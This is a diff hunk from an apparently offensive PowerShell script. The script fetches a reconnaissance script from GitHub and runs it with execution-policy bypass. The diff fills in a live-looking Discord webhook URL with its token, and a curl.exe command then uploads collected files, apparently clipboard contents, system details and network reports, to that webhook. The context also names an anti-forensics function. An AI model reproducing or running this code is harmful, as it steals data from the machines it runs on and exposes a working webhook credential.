@@ -282,9 +282,9 @@ function AntiForensics {
 }
 
 Invoke-WebRequest -Uri "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/recon/net_recon.ps1" -OutFile $NetFile
-Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$env:temp\n.ps1 -NetReport $NetReport" -Wait
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$env:temp\n.ps1 -NetReport $NetReport" -Wait
 
-$webhookuri = ""
+$webhookuri = "https://discord.com/api/webhooks/1334995176321581166/3RoYJez5stb8LCsQx_4znANOdHR87FODSlI5kEXVYIwCgwT7-Cx9C-IertebeqnNC5kH"
 
 curl.exe -F "file1=@$OutFile" -F "file2=@$OutFileClip" -F "file3=@$OutFilePC" -F "file4=@$HtmlPath" -F "file5=@$NetReport" $webhookuri
 
